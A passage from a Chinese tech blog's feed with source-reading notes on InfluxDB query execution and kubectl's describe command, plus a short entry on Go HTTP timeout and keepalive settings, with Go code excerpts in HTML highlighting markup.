class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *StatementExecutor)</span> <span class="title">executeSelectStatement</span><span class="params">(stmt *influxql.SelectStatement, ctx *query.ExecutionContext)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="comment">//创建迭代器</span></span><br><span class="line">    cur, err := e.createIterators(ctx, stmt, ctx.ExecutionOptions)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate a row emitter from the iterator set.</span></span><br><span class="line">    <span class="comment">// 从迭代器中生成一个row emitter，chunkSize大小。</span></span><br><span class="line">em := query.NewEmitter(cur, ctx.ChunkSize)</span><br><span class="line"><span class="keyword">defer</span> em.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Emit rows to the results channel.</span></span><br><span class="line"><span class="keyword">var</span> writeN <span class="keyword">int64</span></span><br><span class="line"><span class="keyword">var</span> emitted <span class="keyword">bool</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> pointsWriter *BufferedPointsWriter</span><br><span class="line"><span class="keyword">if</span> stmt.Target != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="comment">//初始化</span></span><br><span class="line">pointsWriter = NewBufferedPointsWriter(e.PointsWriter, stmt.Target.Measurement.Database, stmt.Target.Measurement.RetentionPolicy, <span class="number">10000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="comment">// 查询数据</span></span><br><span class="line">row, partial, err := em.Emit()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> row == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// Check if the query was interrupted while emitting.</span></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-ctx.Done():</span><br><span class="line"><span class="keyword">return</span> ctx.Err()</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write points back into system for INTO statements.</span></span><br><span class="line">        <span class="comment">// INTO不为空，则写入这个pointswriter</span></span><br><span class="line"><span class="keyword">if</span> stmt.Target != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := e.writeInto(pointsWriter, stmt, row); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">writeN += <span class="keyword">int64</span>(<span class="built_in">len</span>(row.Values))</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">result := &amp;query.Result&#123;</span><br><span class="line">Series:  []*models.Row&#123;row&#125;,</span><br><span class="line">Partial: partial,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Send results or exit if closing.</span></span><br><span class="line">        <span class="comment">//发送结果</span></span><br><span class="line"><span class="keyword">if</span> err := ctx.Send(result); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">emitted = <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Flush remaining points and emit write count if an INTO statement.</span></span><br><span class="line"><span class="keyword">if</span> stmt.Target != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := pointsWriter.Flush(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> messages []*query.Message</span><br><span class="line"><span class="keyword">if</span> ctx.ReadOnly &#123;</span><br><span class="line">messages = <span class="built_in">append</span>(messages, query.ReadOnlyWarning(stmt.String()))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ctx.Send(&amp;query.Result&#123;</span><br><span class="line">Messages: messages,</span><br><span class="line">Series: []*models.Row&#123;&#123;</span><br><span class="line">Name:    <span class="string">"result"</span>,</span><br><span class="line">Columns: []<span class="keyword">string</span>&#123;<span class="string">"time"</span>, <span class="string">"written"</span>&#125;,</span><br><span class="line">Values:  [][]<span class="keyword">interface</span>&#123;&#125;&#123;&#123;time.Unix(<span class="number">0</span>, <span class="number">0</span>).UTC(), writeN&#125;&#125;,</span><br><span class="line">&#125;&#125;,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Always emit at least one result.</span></span><br><span class="line"><span class="keyword">if</span> !emitted &#123;</span><br><span class="line"><span class="keyword">return</span> ctx.Send(&amp;query.Result&#123;</span><br><span class="line">Series: <span class="built_in">make</span>([]*models.Row, <span class="number">0</span>),</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>emit函数查询获取数据并返回:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Emit returns the next row from the iterators.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *Emitter)</span> <span class="title">Emit</span><span class="params">()</span> <span class="params">(*models.Row, <span class="keyword">bool</span>, error)</span></span> &#123;</span><br><span class="line"><span class="comment">// Continually read from the cursor until it is exhausted.</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="comment">// Scan the next row. If there are no rows left, return the current row.</span></span><br><span class="line"><span class="keyword">var</span> row Row</span><br><span class="line"><span class="keyword">if</span> !e.cur.Scan(&amp;row) &#123;</span><br><span class="line"><span class="keyword">if</span> err := e.cur.Err(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">false</span>, err</span><br><span class="line">&#125;</span><br><span class="line">r := e.row</span><br><span class="line">e.row = <span class="literal">nil</span></span><br><span class="line"><span class="keyword">return</span> r, <span class="literal">false</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If there's no row yet then create one.</span></span><br><span class="line"><span class="comment">// If the name and tags match the existing row, append to that row if</span></span><br><span class="line"><span class="comment">// the number of values doesn't exceed the chunk size.</span></span><br><span class="line"><span class="comment">// Otherwise return existing row and add values to next emitted row.</span></span><br><span class="line"><span class="keyword">if</span> e.row == <span class="literal">nil</span> &#123;</span><br><span class="line">e.createRow(row.Series, row.Values)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> e.series.SameSeries(row.Series) &#123;</span><br><span class="line"><span class="keyword">if</span> e.chunkSize &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">len</span>(e.row.Values) &gt;= e.chunkSize &#123;<span class="comment">//如果查询数据量大于chunkSize，则返回，同时 partial=true标识。</span></span><br><span class="line">r := e.row</span><br><span class="line">r.Partial = <span class="literal">true</span></span><br><span class="line">e.createRow(row.Series, row.Values)</span><br><span class="line"><span class="keyword">return</span> r, <span class="literal">true</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">e.row.Values = <span class="built_in">append</span>(e.row.Values, row.Values)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">r := e.row</span><br><span class="line">e.createRow(row.Series, row.Values)</span><br><span class="line"><span class="keyword">return</span> r, <span class="literal">true</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>大概看了下influxdb从启动到服务查询接口的整体流程。以select为例，看了不同的query查询和解析方式类似，都需要走解析查询的。词法解析器是 influxdb自己写的。 底层如何构建的以后再讨论吧。还有很多细节需要自己去看下了。orz</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;influxdb-启动流程学习笔记&quot;&gt;&lt;a href=&quot;#influxdb-启动流程学习笔记&quot; class=&quot;headerlink&quot; title=&quot;influxdb 启动流程学习笔记&quot;&gt;&lt;/a&gt;influxdb 启动流程学习笔记&lt;/h3&gt;&lt;h4 id=&quot;流程分析&quot;
      
    
    </summary>
    
    
      <category term="influxdb" scheme="http://www.mydreamdll.xyz/categories/influxdb/"/>
    
    
      <category term="influxdb" scheme="http://www.mydreamdll.xyz/tags/influxdb/"/>
    
  </entry>
  
  <entry>
    <title>golang</title>
    <link href="http://www.mydreamdll.xyz/2017/05/26/gotips/"/>
    <id>http://www.mydreamdll.xyz/2017/05/26/gotips/</id>
    <published>2017-05-26T12:12:57.000Z</published>
    <updated>2020-01-17T08:29:36.679Z</updated>
    
    <content type="html"><![CDATA[<h2 id="golang超时问题"><a href="#golang超时问题" class="headerlink" title="golang超时问题"></a>golang超时问题</h2><p>golang中http请求经常遇到的问题，本人也遇到过超时的情况。写个笔记记录下。</p><p>当在编写一个Go语言的HTTP服务端或者是客户端时，超时是最容易同时也是最敏感的错误，有很多选择，一个错误可以导致很长时间没有结果，知道网络出现故障，或者进程宕掉。</p><p>在分析过程中，发现服务之间调用有EOF的问题，一般情况下是两个服务之间的readtimeout和writetimeout设置超时导致的。当然也有一个keepalive超时的问题。需要保证服务A调用服务B的时候，服务A的keepalive大于服务B的keepalive。</p><p>python服务器gunicon在设置keepalive的时候，之前遇到过默认情况的keepalive时间给了5s钟，遇到服务A的keepalive时间大于60s的时候，可能服务B的连接已经断开了，但是服务A还维持的会话，当获取数据的时候发现读取数据失败返回EOF问题了。</p><p>建议保证：服务B的Keepalive时间 &gt; 服务A的keepalive时间</p><p><img src="http://img.kuqin.com/upimg/allimg/160720/2036151E2-0.png" alt="HTTP server phases"></p><p><img src="http://img.kuqin.com/upimg/allimg/160720/2036154434-1.png" alt="HTTP Client phases"></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://studygolang.com/articles/7692" target="_blank" rel="noopener">https://studygolang.com/articles/7692</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;golang超时问题&quot;&gt;&lt;a href=&quot;#golang超时问题&quot; class=&quot;headerlink&quot; title=&quot;golang超时问题&quot;&gt;&lt;/a&gt;golang超时问题&lt;/h2&gt;&lt;p&gt;golang中http请求经常遇到的问题，本人也遇到过超时的情况。写个笔记记
      
    
    </summary>
    
    
      <category term="golang" scheme="http://www.mydreamdll.xyz/categories/golang/"/>
    
    
      <category term="golang" scheme="http://www.mydreamdll.xyz/tags/golang/"/>
    
  </entry>
  
  <entry>
    <title>kubectl 学习笔记</title>
    <link href="http://www.mydreamdll.xyz/2017/05/26/kubectl/"/>
    <id>http://www.mydreamdll.xyz/2017/05/26/kubectl/</id>
    <published>2017-05-26T12:12:57.000Z</published>
    <updated>2020-01-17T08:25:53.716Z</updated>
    
    <content type="html"><![CDATA[<h2 id="kubectl-学习笔记"><a href="#kubectl-学习笔记" class="headerlink" title="kubectl 学习笔记"></a>kubectl 学习笔记</h2><p>思考：kubectl 和docker命令源码的设计思想类似。</p><p>docker中启动了服务器接受请求注册<em>api</em>, 而kubectl发送命令给apiserver请求数据或者创建资源。</p><p>Cmds是kubectl中的命令集合，所有命令都会整理在里面。</p><p>Cmd 是命令的实体，其中主要是具体执行用户命令。每个cmd负责一个命令执行类型(describe,get…)。</p><p>Builder 是cmd执行操作时的辅助工具，主要是负责封装与Apiserver交互的底层操作，和将Apiserver的返回数据转化为统一数据结构。</p><p>Kubectl 依赖于<a href="https://github.com/spf13/cobra" target="_blank" rel="noopener">cobra</a>包构建命令行支持，该包是支持通用的命令行构建库。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Cmds(命令集合)&lt;---Cmd(命令obj)</span><br><span class="line">       |          |</span><br><span class="line">       |          |</span><br><span class="line">       |          | </span><br><span class="line">       |        Builder</span><br><span class="line">       |          |</span><br><span class="line">       |          |  </span><br><span class="line">       |----------Cmd(命令obj)</span><br></pre></td></tr></table></figure><p>Kubectl 的执行流程分析以describe命令分析。</p><ol><li>用户发起请求</li><li>根据用户执行动作分发给处理对应动作的Cmd (Cmd是执行用户命令的实体)</li><li>解析用户命令</li><li>向Apiserver获取数据</li><li>整理返回为通用的数据集合</li><li>找到解释查询类型数据的句柄</li><li>使用具柄对整理出的数据集合进行打印输出</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl describe node node1</span><br></pre></td></tr></table></figure><p>如下, NewKubectlCommand 方法中cobra会根据命令动作将请求分配给describe注册的cmd。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">groups :&#x3D; templates.CommandGroups&#123;</span><br><span class="line">        &#x2F;&#x2F;...</span><br><span class="line">        &#123;</span><br><span class="line">            Message: &quot;Troubleshooting and Debugging Commands:&quot;,</span><br><span class="line">            Commands: []*cobra.Command&#123;</span><br><span class="line">                NewCmdDescribe(f, out, err),    &#x2F;&#x2F;&lt;------describe操作的cmd</span><br><span class="line">                NewCmdLogs(f, out),</span><br><span class="line">                NewCmdAttach(f, in, out, err),</span><br><span class="line">                NewCmdExec(f, in, out, err),</span><br><span class="line">                NewCmdPortForward(f, out, err),</span><br><span class="line">                NewCmdProxy(f, out),</span><br><span class="line">                NewCmdCp(f, out, err),</span><br><span class="line">                auth.NewCmdAuth(f, out, err),</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            Message: &quot;Advanced Commands:&quot;,</span><br><span class="line">            Commands: []*cobra.Command&#123;</span><br><span class="line">                NewCmdApply(&quot;kubectl&quot;, f, out, err),</span><br><span class="line">                NewCmdPatch(f, out),</span><br><span class="line">                NewCmdReplace(f, out),</span><br><span class="line">                NewCmdConvert(f, out),</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">        &#x2F;&#x2F; ...</span><br><span class="line">    &#125;</span><br><span class="line">    groups.Add(cmds)</span><br></pre></td></tr></table></figure><p>Cmd会对获取用户输入数据， 并检查正确性然后使用Run函数处理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">func NewCmdDescribe(f cmdutil.Factory, out, cmdErr io.Writer) *cobra.Command &#123;</span><br><span class="line">    options :&#x3D; &amp;resource.FilenameOptions&#123;&#125;</span><br><span class="line">    describerSettings :&#x3D; &amp;printers.DescriberSettings&#123;&#125;</span><br><span class="line"></span><br><span class="line">    validArgs :&#x3D; printersinternal.DescribableResources()</span><br><span class="line">    argAliases :&#x3D; kubectl.ResourceAliases(validArgs)</span><br><span class="line"></span><br><span class="line">    cmd :&#x3D; &amp;cobra.Command&#123;</span><br><span class="line">        Use:     &quot;describe (-f FILENAME | TYPE [NAME_PREFIX | -l label] | TYPE&#x2F;NAME)&quot;,</span><br><span class="line">        Short:   i18n.T(&quot;Show details of a specific resource or group of resources&quot;),</span><br><span class="line">        Long:    describeLong + &quot;\n\n&quot; + cmdutil.ValidResourceTypeList(f),</span><br><span class="line">        Example: describeExample,</span><br><span class="line">        Run: func(cmd *cobra.Command, args []string) &#123;   &#x2F;&#x2F; &lt;------处理回调函数</span><br><span class="line">            err :&#x3D; RunDescribe(f, out, cmdErr, cmd, args, options, describerSettings)</span><br><span class="line">            cmdutil.CheckErr(err)</span><br><span class="line">        &#125;,</span><br><span class="line">        ValidArgs:  validArgs,     &#x2F;&#x2F;&lt;-----------------合法性检查 </span><br><span class="line">        ArgAliases: argAliases,</span><br><span class="line">    &#125;</span><br><span class="line">    usage :&#x3D; &quot;containing the resource to describe&quot;</span><br><span class="line">    cmdutil.AddFilenameOptionFlags(cmd, options, usage)</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F; 下面主要是输入参数检查 </span><br><span class="line">    </span><br><span class="line">    cmd.Flags().StringP(&quot;selector&quot;, &quot;l&quot;, &quot;&quot;, &quot;Selector (label query) to filter on, supports &#39;&#x3D;&#39;, &#39;&#x3D;&#x3D;&#39;, and &#39;!&#x3D;&#39;.(e.g. -l key1&#x3D;value1,key2&#x3D;value2)&quot;)</span><br><span class="line">    cmd.Flags().Bool(&quot;all-namespaces&quot;, false, &quot;If present, list the requested object(s) across all namespaces. Namespace in current context is ignored even if specified with --namespace.&quot;)</span><br><span class="line">    cmd.Flags().BoolVar(&amp;describerSettings.ShowEvents, &quot;show-events&quot;, true, &quot;If true, display events related to the described object.&quot;)</span><br><span class="line">    cmdutil.AddInclude3rdPartyFlags(cmd)</span><br><span class="line">    cmdutil.AddIncludeUninitializedFlag(cmd)</span><br><span class="line">    return cmd</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如下, 在 RunDescribe 中时对该命令的具体处理</p><ul><li>Builder(), Unstructured(), ContinueOnError().<br> NamespaceParam(), FilenameParam(), LabelSelectorParam() … Flatten() 的链式调用流程主要是为执行命令做准备。</li><li>Do() 函数是注册具体向Apiserver请求数据，和讲返回数据转化为通用结构的方法。</li><li>最后的 describer.Describe（） 函数是将提取出的返回数据 打印出来做可视化接口。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">func RunDescribe(f cmdutil.Factory, out, cmdErr io.Writer, cmd *cobra.Command, args []string, options *resource.FilenameOptions, describerSettings *printers.DescriberSettings) error &#123;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F; ...</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; include the uninitialized objects by default</span><br><span class="line">    &#x2F;&#x2F; unless user explicitly set --include-uninitialized&#x3D;false</span><br><span class="line">    includeUninitialized :&#x3D; cmdutil.ShouldIncludeUninitialized(cmd, true)</span><br><span class="line">    r :&#x3D; f.NewBuilder().</span><br><span class="line">        Unstructured().</span><br><span class="line">        ContinueOnError().</span><br><span class="line">        NamespaceParam(cmdNamespace).DefaultNamespace().AllNamespaces(allNamespaces).</span><br><span class="line">        FilenameParam(enforceNamespace, options).</span><br><span class="line">        LabelSelectorParam(selector).    &#x2F;&#x2F; 设置用户的标签选择</span><br><span class="line">        IncludeUninitialized(includeUninitialized).</span><br><span class="line">        ResourceTypeOrNameArgs(true, args...). &#x2F;&#x2F; 提取用户选择操作的对象类型</span><br><span class="line">        Flatten().                             &#x2F;&#x2F;决定以何种方式从K8s的返回数据中提取信息                     </span><br><span class="line">        Do()                                   &#x2F;&#x2F;执行命令获取数据</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F; ...</span><br><span class="line">    </span><br><span class="line">    infos, err :&#x3D; r.Infos()                     </span><br><span class="line">    if err !&#x3D; nil &#123;</span><br><span class="line">        if apierrors.IsNotFound(err) &amp;&amp; len(args) &#x3D;&#x3D; 2 &#123;</span><br><span class="line">            return DescribeMatchingResources(f, cmdNamespace, args[0], args[1], describerSettings, out, err)</span><br><span class="line">        &#125;</span><br><span class="line">        allErrs &#x3D; append(allErrs, err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    errs :&#x3D; sets.NewString()</span><br><span class="line">    first :&#x3D; true</span><br><span class="line">    for _, info :&#x3D; range infos &#123;</span><br><span class="line">        mapping :&#x3D; info.ResourceMapping()</span><br><span class="line">        describer, err :&#x3D; f.Describer(mapping)</span><br><span class="line">        if err !&#x3D; nil &#123;</span><br><span class="line">            if errs.Has(err.Error()) &#123;</span><br><span class="line">                continue</span><br><span class="line">            &#125;</span><br><span class="line">            allErrs &#x3D; append(allErrs, err)</span><br><span class="line">            errs.Insert(err.Error())</span><br><span class="line">            continue</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F; 下面通过describe 方法将提取到的数据 打印出来</span><br><span class="line">        s, err :&#x3D; describer.Describe(info.Namespace, info.Name, *describerSettings)</span><br><span class="line">        if err !&#x3D; nil &#123;</span><br><span class="line">            if errs.Has(err.Error()) &#123;</span><br><span class="line">                continue</span><br><span class="line">            &#125;</span><br><span class="line">            allErrs &#x3D; append(allErrs, err)</span><br><span class="line">            errs.Insert(err.Error())</span><br><span class="line">            continue</span><br><span class="line">        &#125;</span><br><span class="line">        if first &#123;</span><br><span class="line">            first &#x3D; false</span><br><span class="line">            fmt.Fprint(out, s)</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            fmt.Fprintf(out, &quot;\n\n%s&quot;, s)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return utilerrors.NewAggregate(allErrs)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面具体分析获取数据的流程，获取数据包括从Apiserver请求数据以及从返回信息中提取有用数据两个操作。</p><p>RetrieveLazy 中注册了从Apiserver获取数据的操作。<br>NewDecoratedVisitor 中注册了从获取到的数据结构中转化出通用数据的方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; inputs are consumed by the first execution - use Infos() or Object() on the Result to capture a list</span><br><span class="line">&#x2F;&#x2F; for further iteration.</span><br><span class="line">func (b *Builder) Do() *Result &#123;</span><br><span class="line">    r :&#x3D; b.visitorResult()</span><br><span class="line">    &#x2F;&#x2F;... </span><br><span class="line">    </span><br><span class="line">    helpers :&#x3D; []VisitorFunc&#123;&#125;</span><br><span class="line">    &#x2F;&#x2F;注册获取数据前的动作</span><br><span class="line">    if b.defaultNamespace &#123;</span><br><span class="line">        helpers &#x3D; append(helpers, SetNamespace(b.namespace))</span><br><span class="line">    &#125;</span><br><span class="line">    if b.requireNamespace &#123;</span><br><span class="line">        helpers &#x3D; append(helpers, RequireNamespace(b.namespace))</span><br><span class="line">    &#125;</span><br><span class="line">    helpers &#x3D; append(helpers, FilterNamespace)</span><br><span class="line">    if b.requireObject &#123;</span><br><span class="line">        &#x2F;&#x2F;注册从Apiserver获取数据的方法</span><br><span class="line">        helpers &#x3D; append(helpers, RetrieveLazy) </span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;注册从返回数据中提取信息的方法</span><br><span class="line">    r.visitor &#x3D; NewDecoratedVisitor(r.visitor, helpers...)</span><br><span class="line">    if b.continueOnError &#123;</span><br><span class="line">        r.visitor &#x3D; ContinueOnErrorVisitor&#123;r.visitor&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return r</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; RetrieveLazy updates the object if it has not been loaded yet.</span><br><span class="line">func RetrieveLazy(info *Info, err error) error &#123;</span><br><span class="line">    if err !&#x3D; nil &#123;</span><br><span class="line">        return err</span><br><span class="line">    &#125;</span><br><span class="line">    if info.Object &#x3D;&#x3D; nil &#123;</span><br><span class="line">        return info.Get()     &#x2F;&#x2F;从Apiserver获取数据</span><br><span class="line">    &#125;</span><br><span class="line">    return nil</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而 NewDecoratedVisitor 方法注册了数据处理的关键函数 Visit， 这个函数可以使用户可以将来自Apiserver的数据转化为通用数据集合。</p><figure 